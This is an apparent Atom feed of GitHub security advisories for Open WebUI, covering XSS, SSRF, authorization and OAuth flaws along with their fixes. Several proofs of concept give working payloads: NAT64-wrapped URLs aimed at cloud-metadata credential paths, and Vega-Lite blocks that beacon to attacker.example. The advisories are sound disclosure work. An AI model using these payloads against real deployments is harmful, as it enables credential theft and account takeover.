<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-08-04T20:16:32.048Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Same-origin XSS to account takeover via terminal file-preview iframe hardcoding allow-same-origin]]></title>
        <id>https://github.com/advisories/GHSA-3xpf-xq7r-v8c5</id>
        <link href="https://github.com/advisories/GHSA-3xpf-xq7r-v8c5"/>
        <updated>2026-08-04T20:02:04.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Any authenticated user with access to a terminal server could get script of their choosing to run in the Open WebUI origin itself. The HTML file preview rendered terminal-served files in an iframe whose sandbox always granted <code>allow-same-origin</code> alongside <code>allow-scripts</code>, and the file is served from a path on the application's own origin, so the sandbox provided no isolation at all. Script in a previewed file could read the victim's session token and take over the account.</p>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li>At least one terminal server configured by an admin (<code>TERMINAL_SERVER_CONNECTIONS</code>, empty by default) and reachable by the victim. Deployments with no terminal server configured are not affected.</li>
<li>The attacker needs a normal authenticated account with access to that terminal server, no admin rights.</li>
<li>No victim interaction beyond having the chat open: a <code>display_file</code> tool call opens the preview automatically.</li>
<li><code>TERMINAL_PROXY_HEADERS</code> unset, which is the default. An operator who had already set a restrictive Content-Security-Policy through it was not exposed, since those headers are merged into every proxied response including the served file.</li>
<li>The <code>iframeSandboxAllowSameOrigin</code> user setting is off by default, but the affected branch ignored it entirely.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>The previewed document runs in the application origin, so it can reach the parent window, read the session token out of <code>localStorage</code> and exfiltrate it, which is full account takeover of the victim. If the victim is an admin, or any user holding <code>workspace.functions</code>, that takeover extends to server-side code execution through Functions. Getting the malicious file written and displayed still requires a prompt-injection or a social step, which is what keeps the complexity high rather than trivial. Instances with no terminal server configured were never affected, and neither was the <code>srcdoc</code> preview path.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in 0.11.0 by 65a5fad7b (#26907). The <code>serveUrl</code> preview branch now gates <code>allow-same-origin</code> behind the same <code>iframeSandboxAllowSameOrigin</code> setting the <code>srcdoc</code> branch already used, so by default the preview loads at an opaque origin and cannot reach the parent context. Upgrading is sufficient, no configuration change is required, and HTML previews continue to render normally.</p>
<h2 id="root-cause">Root cause</h2>
<ul>
<li><code>src/lib/components/chat/FileNav/FilePreview.svelte</code>, the <code>serveUrl</code> iframe branch, reached for HTML files served through <code>/api/v1/terminals/{id}/files/serve/...</code>.</li>
<li>Present from 0.9.0, where that branch was introduced, through 0.10.2.</li>
</ul>
<p>The component grew two preview paths. The <code>srcdoc</code> path was hardened: same-origin became opt-in and a CSP was injected into the document. The <code>serveUrl</code> path, added later for files streamed from a terminal server, kept a static sandbox string with <code>allow-same-origin</code> baked into it. Because the terminal proxy is mounted under the application's own origin and forwards the upstream response without adding a Content-Security-Policy of its own unless the operator configured one, and no global CSP is set, the sandbox was the only isolation boundary left, and it was granting precisely the permission that dissolved it.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Write an HTML file containing a script that reads <code>window.parent.localStorage.token</code> to a terminal server the victim can reach, then trigger <code>display_file</code> for that file. The chat handler opens the preview on the resulting <code>terminal:display_file</code> event with no click, the script executes at the application origin, and the token is exfiltrated.</p>
<h2 id="credits">Credits</h2>
<p>Reported by @manus-use (researcher zx / Jace).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-3xpf-xq7r-v8c5">https://github.com/open-webui/open-webui/security/advisories/GHSA-3xpf-xq7r-v8c5</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/26907">https://github.com/open-webui/open-webui/pull/26907</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/65a5fad7b97db99d490d81f4e0860282c3a4543c">https://github.com/open-webui/open-webui/commit/65a5fad7b97db99d490d81f4e0860282c3a4543c</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.0">https://github.com/open-webui/open-webui/releases/tag/v0.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-3xpf-xq7r-v8c5">https://github.com/advisories/GHSA-3xpf-xq7r-v8c5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3xpf-xq7r-v8c5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-04T20:02:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Any authenticated user can reach internal services and cloud metadata via NAT64-encoded URLs]]></title>
        <id>https://github.com/advisories/GHSA-8x5v-cpv7-8jjp</id>
        <link href="https://github.com/advisories/GHSA-8x5v-cpv7-8jjp"/>
        <updated>2026-08-04T19:59:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Open WebUI fetches user-supplied URLs on the server for RAG URL ingestion, URL-to-markdown conversion and web-search content retrieval, and decides whether a destination is allowed by asking whether its IP address is globally routable. That test operates on the literal IPv6 address and does not look at the IPv4 address embedded inside it. On a deployment whose network has a NAT64 gateway, any verified user can wrap an internal or cloud-metadata IPv4 address in the NAT64 well-known prefix, pass the filter, and receive the internal response body back through the API.</p>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li>Any verified (authenticated) user account. No admin role, no elevated permission.</li>
<li>Default configuration: <code>ENABLE_LOCAL_WEB_FETCH</code> off, the default <code>WEB_FETCH_FILTER_LIST</code> metadata blocklist in place. Neither prevents this, because the blocklist matches hostname strings and the NAT64 literal is not one of them.</li>
<li>The deployment's network must provide NAT64 translation for the well-known <code>64:ff9b::/96</code> prefix, which is the common default on IPv6-only and dual-stack cloud and Kubernetes networks.</li>
<li>Deployments on IPv4-only networks, or on any network without a NAT64 gateway, are not affected: the address has nowhere to route.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>On an affected network a low-privilege user can read GET responses from services the server can reach but the internet cannot: cloud instance metadata including IAM role credentials, loopback-bound admin surfaces, and internal APIs in the same VPC or cluster. The response body is returned to the caller, so this is full-read, not blind. Exploitation is not universal, it depends entirely on the deployment's network providing NAT64 translation, which is why the score carries high attack complexity. Deployments without NAT64 lose nothing here.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in v0.11.0 by commit <code>1717b493d</code>. Address classification now unwraps the IPv4 embedded in IPv6 transition encodings before deciding whether a destination is global, and applies that at all three checkpoints. NAT64-wrapped public destinations continue to work. Upgrading to v0.11.0 fully resolves the issue with no configuration change.</p>
<h2 id="root-cause">Root cause</h2>
<ul>
<li><code>backend/open_webui/retrieval/web/utils.py</code> — <code>validate_url()</code>, the pre-fetch check on the submitted URL.</li>
<li><code>backend/open_webui/retrieval/web/utils.py</code> — <code>_ssrf_safe_new_conn()</code> and <code>_SSRFSafeResolver</code>, the connect-time re-checks that defeat DNS rebinding.</li>
</ul>
<p>All three decided reachability from <code>ipaddress.ip_address(ip).is_global</code> applied to the literal address. That predicate answers whether an IPv6 address sits in globally-routable space, which is a different question from where the packet actually ends up once a transition gateway translates it. The NAT64 well-known prefix is by design a global prefix carrying an arbitrary IPv4 destination, so an internal target wrapped in it satisfies the check while reaching exactly what the check exists to prevent. Because the same predicate backed the connect-time re-checks, no later layer caught it either. The fix inspects every standardized transition encoding rather than only the NAT64 prefix, since the same reasoning error applies to each of them.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Against the real <code>POST /api/v1/retrieval/process/web</code> flow on v0.10.2 as an authenticated user, with internal HTTP services returning a marker string. The plain forms are rejected with HTTP 400:</p>
<pre><code>http://169.254.169.254/latest/meta-data/          -&gt; 400
http://127.0.0.1/                                 -&gt; 400
http://[::ffff:169.254.169.254]/                  -&gt; 400
http://metadata.google.internal/                  -&gt; 400
</code></pre>
<p>The NAT64 encodings of the same targets are accepted, and the response body is returned in the <code>content</code> field:</p>
<pre><code>http://[64:ff9b::a9fe:a9fe]/latest/meta-data/iam/security-credentials/   -&gt; 200, marker returned
http://[64:ff9b::7f00:1]/admin/internal-status                          -&gt; 200, marker returned
</code></pre>
<p>NAT64 translation was modelled by binding the translated addresses locally rather than by routing through a real NAT64 gateway; everything else, including the request flow and the validation code, is the unmodified v0.10.2 path. After the fix both URLs return 400 while <code>http://[64:ff9b::808:808]/</code> (8.8.8.8, public) still returns 200, confirming no over-blocking.</p>
<h2 id="credits">Credits</h2>
<ul>
<li>tonghuaroot — reported the transition-form gap in the address classification and supplied the fix approach.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-8x5v-cpv7-8jjp">https://github.com/open-webui/open-webui/security/advisories/GHSA-8x5v-cpv7-8jjp</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/1717b493d83c86afa82aa8bc50139250852dd2f3">https://github.com/open-webui/open-webui/commit/1717b493d83c86afa82aa8bc50139250852dd2f3</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.0">https://github.com/open-webui/open-webui/releases/tag/v0.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-8x5v-cpv7-8jjp">https://github.com/advisories/GHSA-8x5v-cpv7-8jjp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8x5v-cpv7-8jjp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-04T19:59:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Users denied the image-generation permission can still generate images via chat completions]]></title>
        <id>https://github.com/advisories/GHSA-g423-grf7-98rv</id>
        <link href="https://github.com/advisories/GHSA-g423-grf7-98rv"/>
        <updated>2026-08-04T19:57:00.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An authenticated user whose <code>features.image_generation</code> permission has been revoked can still make the server generate images by sending the feature flag in a chat-completion request. The chat pipeline took the client-supplied <code>features</code> object at face value and never re-checked the permission that the direct image routes enforce, so the denial applied to the UI affordance but not to the server-side generation path.</p>
<h2 id="preconditions">Preconditions</h2>
<p>Image generation must be enabled and a provider configured by the administrator (<code>ENABLE_IMAGE_GENERATION</code> is off by default). The per-user permission defaults to granted, so only deployments where an administrator explicitly revoked it for some users are affected. On 0.10.0 and later the caller must also set <code>params.function_calling</code> to <code>legacy</code>; on 0.9.x and earlier the legacy mode was the default, so no special parameter was needed. Deployments on native function calling are unaffected, since that path checks the permission before registering the image tools.</p>
<h2 id="impact">Impact</h2>
<p>A user the administrator has explicitly denied image generation can consume the operator's configured provider through the chat API, spending the operator's API credits and provider quota and writing generated files to the operator's storage. Where an image is present in the conversation and image editing is enabled, the same handler reaches the image-edit provider as well. No provider credentials are exposed, and no other user's data is reachable.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in 897d69a (#26703). The legacy chat-features block now re-checks <code>features.image_generation</code> against the caller's permissions before invoking the image handler, matching the check the direct image routes and the native function-calling path already performed.</p>
<h2 id="root-cause">Root cause</h2>
<p>The chat-completions endpoint stored the request's <code>features</code> object into request metadata, and <code>process_chat_payload</code> in the chat middleware dispatched to the image handler purely on the truthiness of that client-supplied flag. Permission enforcement lived on the two surfaces that were reached from the UI, the direct <code>/images/generations</code> and <code>/images/edit</code> routes and the native function-calling tool registration, and was simply absent on the legacy chat path. The flag was treated as a statement of user intent, which it is, rather than as an authorization decision, which the handler behind it made it.</p>
<h2 id="credits">Credits</h2>
<p>@DavidCarliez, for identifying that the chat pipeline honours the client-supplied image-generation feature flag without re-checking the permission.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-g423-grf7-98rv">https://github.com/open-webui/open-webui/security/advisories/GHSA-g423-grf7-98rv</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/26703">https://github.com/open-webui/open-webui/pull/26703</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/897d69a35c65f8ab54583bb9ca8dc74eab7bcd29">https://github.com/open-webui/open-webui/commit/897d69a35c65f8ab54583bb9ca8dc74eab7bcd29</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.0">https://github.com/open-webui/open-webui/releases/tag/v0.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-g423-grf7-98rv">https://github.com/advisories/GHSA-g423-grf7-98rv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g423-grf7-98rv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-04T19:56:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Client-side SSRF via unrestricted external resource loading in Vega/Vega-Lite chart rendering]]></title>
        <id>https://github.com/advisories/GHSA-rffm-9q57-q649</id>
        <link href="https://github.com/advisories/GHSA-rffm-9q57-q649"/>
        <updated>2026-08-04T19:54:59.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Open WebUI renders <code>vega</code> and <code>vega-lite</code> fenced code blocks in chat content by building a Vega view in the viewer's browser without a restricted resource loader. Any user who can place such a block where another user will see it can make that user's browser issue attacker-chosen outbound GET requests, and read back responses from same-origin or CORS-permissive targets into the rendered page. Because the request comes from the browser, server-side SSRF protections never see it.</p>
<h2 id="preconditions">Preconditions</h2>
<p>Default configuration, no flags or environment variables involved: Vega blocks render unconditionally wherever chat content is displayed. The attacker needs an account that can put content in front of the victim, which covers a shared chat, a channel message, and model, RAG or tool output the attacker can influence. The victim must open the message, so this is not zero-click. Deployments where the victim's browser has no network position of interest lose little.</p>
<h2 id="impact">Impact</h2>
<p>The victim's browser becomes a request proxy into whatever it can reach: internal hosts and ports behind the perimeter, same-site endpoints, and out-of-band beacons that confirm a chart was viewed and by whom. Where the target is same-origin or returns permissive CORS headers, the response body is pulled back into the chart in the victim's page, which turns the request into a read. Requests are GET only, and no server-side data is exposed to the attacker directly.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in 5278eb906 (#26806), released in 0.11.0. The view is now constructed with a loader whose <code>load</code> always throws and whose <code>sanitize</code> resolves the URI with the browser's own URL parser and permits only <code>data:</code> and same-origin results, so charts can only use inline <code>data.values</code>. Upgrading is sufficient; no configuration change is needed.</p>
<h2 id="root-cause">Root cause</h2>
<ul>
<li><code>src/lib/utils/index.ts</code> — <code>renderVegaVisualization</code></li>
<li><code>src/lib/components/chat/Messages/CodeBlock.svelte</code> — renders <code>vega</code>/<code>vega-lite</code> blocks</li>
</ul>
<p>The renderer treated a chart spec as trusted authored content rather than as untrusted chat text, so it accepted Vega's default loader. That loader has two separate ways out of the page: <code>data.url</code> and topojson/geo sources are fetched at view construction, and image marks pass their <code>url</code> through <code>sanitize</code> and are written into the output SVG as <code>&lt;image href&gt;</code>, which the browser fetches when the chart is displayed. The second path survives downstream SVG sanitization because the URL is a legitimate attribute value, not markup.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Post either block into a chat, channel message, or shared chat that the victim will open. Neither requires the victim to interact beyond viewing.</p>
<pre><code class="language-vega-lite">{"$schema":"https://vega.github.io/schema/vega-lite/v5.json","data":{"url":"http://attacker.example/probe?a=1"},"mark":"point"}
</code></pre>
<pre><code class="language-vega-lite">{"$schema":"https://vega.github.io/schema/vega-lite/v5.json","data":{"values":[{"x":1}]},"mark":{"type":"image","url":"http://attacker.example/beacon.png"},"encoding":{"x":{"field":"x"}}}
</code></pre>
<p>The first fires at view construction; the second fires when the rendered SVG is displayed. Both are visible as outbound requests in the victim's network log and in the attacker's listener. After the fix neither request is made and inline <code>data.values</code> charts still render.</p>
<h2 id="credits">Credits</h2>
<ul>
<li>@Zureno — reported the issue and the <code>data.url</code> path.</li>
<li>@Classic298 — identified the image-mark sink and authored the fix.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-rffm-9q57-q649">https://github.com/open-webui/open-webui/security/advisories/GHSA-rffm-9q57-q649</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/26806">https://github.com/open-webui/open-webui/pull/26806</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/5278eb906ebecefc6538a19bc86df09d997e43e6">https://github.com/open-webui/open-webui/commit/5278eb906ebecefc6538a19bc86df09d997e43e6</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.0">https://github.com/open-webui/open-webui/releases/tag/v0.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-rffm-9q57-q649">https://github.com/advisories/GHSA-rffm-9q57-q649</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rffm-9q57-q649</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-04T19:54:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Any authenticated user can cancel another user's chat generation via the chat delete endpoint]]></title>
        <id>https://github.com/advisories/GHSA-3vf6-64vr-3g56</id>
        <link href="https://github.com/advisories/GHSA-3vf6-64vr-3g56"/>
        <updated>2026-08-04T19:54:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>DELETE /api/v1/chats/{id}</code> cancelled a chat's in-flight tasks before it checked whether the caller was allowed to delete that chat. Any authenticated user who knew another user's chat id could therefore abort that user's running model response, title generation or tag generation. The deletion itself was still refused, so the only missing control was on the cancellation side effect.</p>
<h2 id="preconditions">Preconditions</h2>
<p>Default configuration, no special deployment shape. The attacker needs a normal account with the default <code>user</code> role and nothing else: the <code>chat.delete</code> permission is not required, and revoking it does not prevent the cancellation. The attacker also needs the victim's chat id, which is returned by the read-only shared-chat endpoint when a chat or a folder has been shared with them - otherwise enumerating the chat id requires guessing the chat id or brute forcing it, and the victim must have a generation running at that moment.</p>
<h2 id="impact">Impact</h2>
<p>A user can repeatedly interrupt another user's generations without any write access to the target chat. Nothing is deleted, modified or disclosed, and the victim can simply regenerate, so the effect is limited to availability of in-flight responses. Because the attacker only needs a chat id, the interruption can be scripted and repeated for as long as the id stays valid.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in <a href="https://github.com/open-webui/open-webui/pull/27006">https://github.com/open-webui/open-webui/pull/27006</a>, released in 0.11.0. The handler now resolves and authorizes the chat first and only cancels tasks and deletes once the caller is an admin or a permitted owner; an unauthorized caller gets 401 or 404 with no cancellation.</p>
<h2 id="root-cause">Root cause</h2>
<p>Affected component: <code>delete_chat_by_id</code> in <code>backend/open_webui/routers/chats.py</code>, serving <code>DELETE /api/v1/chats/{id}</code>. Affected setup: every build from 0.9.6 up to and including 0.10.2.</p>
<p>The cancellation was written as a cleanup step for the delete that follows it, and it was placed at the top of the handler so that it would run before the chat row disappeared. That put an unauthenticated-by-ownership side effect ahead of every check in the function: the admin branch, the <code>chat.delete</code> permission check, and the owner lookup all ran afterwards, so their outcome could no longer affect whether the tasks were stopped. The dedicated task-stop endpoint already verified ownership before calling the same helper, so the intended ordering existed elsewhere in the codebase.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Against a 0.10.2 instance with two accounts, a victim admin and an attacker holding the default <code>user</code> role, and an upstream that streams slowly:</p>
<ol>
<li>As the victim, start a generation in a chat and confirm <code>GET /api/tasks/chat/{chat_id}</code> reports one active task.</li>
<li>As the attacker, confirm <code>GET /api/v1/chats/{chat_id}</code> returns 401, then send <code>DELETE /api/v1/chats/{chat_id}</code>.</li>
<li>The delete is refused with 404, the chat still exists, but the victim's task list is now empty and the assistant message is marked done mid-generation. A control run without step 2 keeps generating.</li>
</ol>
<p>Repeating step 2 with the <code>chat.delete</code> permission revoked for the <code>user</code> role returns 401 and still cancels the task. The same sequence against 0.11.0 leaves the task running.</p>
<h2 id="credits">Credits</h2>
<p>@GabrielGomesAL, who reported the missing authorization on the chat delete endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-3vf6-64vr-3g56">https://github.com/open-webui/open-webui/security/advisories/GHSA-3vf6-64vr-3g56</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/27006">https://github.com/open-webui/open-webui/pull/27006</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/4f93c3e36c1734342a32c312bdb0516c66d8e93c">https://github.com/open-webui/open-webui/commit/4f93c3e36c1734342a32c312bdb0516c66d8e93c</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.0">https://github.com/open-webui/open-webui/releases/tag/v0.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-3vf6-64vr-3g56">https://github.com/advisories/GHSA-3vf6-64vr-3g56</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3vf6-64vr-3g56</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-08-04T19:54:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Account takeover via OAuth token exchange accepting tokens issued to any client]]></title>
        <id>https://github.com/advisories/GHSA-rq84-p6rr-vf89</id>
        <link href="https://github.com/advisories/GHSA-rq84-p6rr-vf89"/>
        <updated>2026-08-04T19:52:03.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The OAuth token exchange endpoint accepts a raw provider access token and validates it by calling the provider's userinfo endpoint. A userinfo endpoint reports only that a token is valid, never which OAuth client it was issued to, and the endpoint performed no audience or client check of its own. Anyone holding an access token minted for any client registered with the same provider could exchange it for an Open WebUI session as that token's user, including applications the operator does not control and has never authorised.</p>
<h2 id="preconditions">Preconditions</h2>
<ul>
<li><code>ENABLE_OAUTH_TOKEN_EXCHANGE=True</code>. Disabled by default, so a stock deployment is not affected.</li>
<li>The victim already has an Open WebUI account. The endpoint does not create users.</li>
<li>The attacker can obtain a provider access token for the victim, typically by having them sign in to an unrelated OAuth application on the same provider. On public providers, registering that application is self-service.</li>
<li>The subject identifier the attacker's client observes matches the one stored on the victim's account. Google, GitHub, Okta and self-hosted OIDC servers in default configuration issue a subject that is stable across all clients and are directly affected. Microsoft Entra ID issues per-application subjects, so the match fails there unless <code>OAUTH_MERGE_ACCOUNTS_BY_EMAIL</code> is enabled or <code>OAUTH_SUB_CLAIM</code> points at a globally stable claim such as <code>oid</code>.</li>
<li><code>OAUTH_ALLOWED_DOMAINS</code> is enforced on this endpoint but does not constrain the attack, because the impersonated user is a legitimate member of an allowed domain.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Full account takeover of any user whose provider access token the attacker can obtain. The endpoint applies no role gating, so the issued session carries the target account's role, and a targeted administrator yields an administrator session. The victim never interacts with Open WebUI and has no opportunity to notice.</p>
<p>The standard OAuth callback is not affected. It obtains its token through an authorization-code exchange authenticated with the client secret, so the token is inherently bound to Open WebUI's own client, and the ID token's audience is validated.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in 0.11.0. The endpoint now resolves which OAuth client a presented token was issued to through RFC 7662 token introspection, and rejects tokens minted for any client not named in <code>OAUTH_TOKEN_EXCHANGE_TRUSTED_CLIENT_IDS</code>. Only the introspected <code>client_id</code> is honoured; the <code>aud</code> field is ignored, because it names intended resource servers rather than the issuing client and several providers let any client place another client's identifier there.</p>
<p><strong>Upgrading alone is not sufficient.</strong> The check is opt-in: with <code>OAUTH_TOKEN_EXCHANGE_TRUSTED_CLIENT_IDS</code> unset the endpoint behaves as it did before, so any deployment running with <code>ENABLE_OAUTH_TOKEN_EXCHANGE=True</code> must also set that list. It is a deploy-time environment variable and cannot be changed from the admin interface, so a compromised administrator session cannot widen the trust boundary at runtime.</p>
<p>Providers that do not implement RFC 7662 introspection, including Google, Microsoft Entra ID, GitHub and Feishu, cannot be restricted this way at all. <strong>On those, token exchange has no safe configuration and should be left disabled.</strong></p>
<h2 id="root-cause">Root cause</h2>
<ul>
<li><code>backend/open_webui/routers/auths.py</code>, <code>token_exchange</code> (<code>POST /api/v1/auths/oauth/{provider}/token/exchange</code>)</li>
</ul>
<p>Token exchange skips the authorization-code step entirely and trusts a token supplied by the caller. The only validation performed was a userinfo lookup, which answers whether a token is valid rather than who issued it, so the endpoint had no way to distinguish a token minted for Open WebUI from one minted for an unrelated application.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Reproduced against a mock OIDC provider serving two tokens for the same end user, minted for two different clients, with <code>OAUTH_ALLOWED_DOMAINS=corp.example</code> actively enforced.</p>
<table>
<thead>
<tr>
<th>Case</th>
<th>Token</th>
<th>Result</th>
</tr>
</thead>
<tbody><tr>
<td>Control</td>
<td>not recognised by the provider</td>
<td>400 rejected</td>
</tr>
<tr>
<td>Outsider's own account, non-allowed domain</td>
<td>minted for <code>attacker-evil-app</code></td>
<td>403 blocked by domain allowlist</td>
</tr>
<tr>
<td>Victim's account, foreign client</td>
<td>minted for <code>attacker-evil-app</code></td>
<td>200, session issued for <code>victim@corp.example</code></td>
</tr>
</tbody></table>
<p>The issued session token was confirmed usable: <code>GET /api/v1/auths/</code> returned 200 authenticated as the victim. The provider log recorded the token as minted for <code>client_id='attacker-evil-app'</code>, while Open WebUI's own client is <code>openwebui-client-id</code>.</p>
<h2 id="credits">Credits</h2>
<p>Reported by @Classic298.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-rq84-p6rr-vf89">https://github.com/open-webui/open-webui/security/advisories/GHSA-rq84-p6rr-vf89</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/b190dcf3caa00dc8b7b9c7312828298d9143f60d">https://github.com/open-webui/open-webui/commit/b190dcf3caa00dc8b7b9c7312828298d9143f60d</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/c4332be71e6e9c314e8a13b9d2819a6932561630">https://github.com/open-webui/open-webui/commit/c4332be71e6e9c314e8a13b9d2819a6932561630</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.11.0">https://github.com/open-webui/open-webui/releases/tag/v0.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-rq84-p6rr-vf89">https://github.com/advisories/GHSA-rq84-p6rr-vf89</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rq84-p6rr-vf89</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-04T19:52:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Any member with write access to a standard channel can edit or delete other members' messages]]></title>
        <id>https://github.com/advisories/GHSA-mj5r-jf49-m3w7</id>
        <link href="https://github.com/advisories/GHSA-mj5r-jf49-m3w7"/>
        <updated>2026-08-04T19:45:40.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>On standard channels, the message update and delete handlers accepted any caller holding write access on the channel, without checking that the caller wrote the message. Write access is the same grant a member needs in order to post, so every ordinary participant in a shared channel could rewrite or permanently delete any other participant's messages. The group and direct message branch of the same handlers enforced authorship; the standard branch did not.</p>
<h2 id="preconditions">Preconditions</h2>
<p>Channels are disabled by default and must be enabled by an administrator (<code>ENABLE_CHANNELS</code>). The channel must be a standard channel; group and direct message channels are not affected. The attacker is any authenticated account with role <code>user</code> that holds write access on the channel, whether granted publicly, per user, or through a group. No ownership of the channel, channel manager role, or elevated role is required. Channel and message ids are returned by the listing endpoints the member can already call.</p>
<h2 id="impact">Impact</h2>
<p>An ordinary member could replace the content of another member's message while the message stayed attributed to its original author, and could attach arbitrary <code>data</code> and <code>meta</code> payloads to it through the same form. The member could also permanently delete other members' messages, up to the entire visible history of the channel. This is an integrity and availability loss against other users of the channel: content can be forged under a colleague's name and records can be destroyed. It reaches no further than channels the attacker already has write access to, and it discloses nothing the attacker could not already read as a member. Pinning is unaffected and is not part of this issue.</p>
<h2 id="fix">Fix</h2>
<p>Fixed in <code>c609ec411</code> (#27197), released in 0.11.0. Both handlers now apply the same authorship check the group and direct message branch already used, so a non-admin caller can act only on their own messages regardless of write access. Upgrading fully resolves it, with no configuration change required.</p>
<h2 id="root-cause">Root cause</h2>
<p>Affected components:</p>
<ul>
<li><code>backend/open_webui/routers/channels.py</code>, <code>update_message_by_id</code> (<code>POST /api/v1/channels/{id}/messages/{message_id}/update</code>)</li>
<li><code>backend/open_webui/routers/channels.py</code>, <code>delete_message_by_id</code> (<code>DELETE /api/v1/channels/{id}/messages/{message_id}/delete</code>)</li>
</ul>
<p>Both handlers branch on channel type, and the two branches asked different questions. The group and direct message branch asked whether the caller wrote the message. The standard branch asked whether the caller is allowed to write in the channel, which is a permission level, not an identity. Those are not interchangeable: posting a message runs that same write check, so the grant that lets a member participate was silently accepted as the grant to rewrite and remove everyone else's content, and every ordinary participant satisfied it. The model layer looks messages up by primary key alone, so the router branch was the only authorization that ran.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
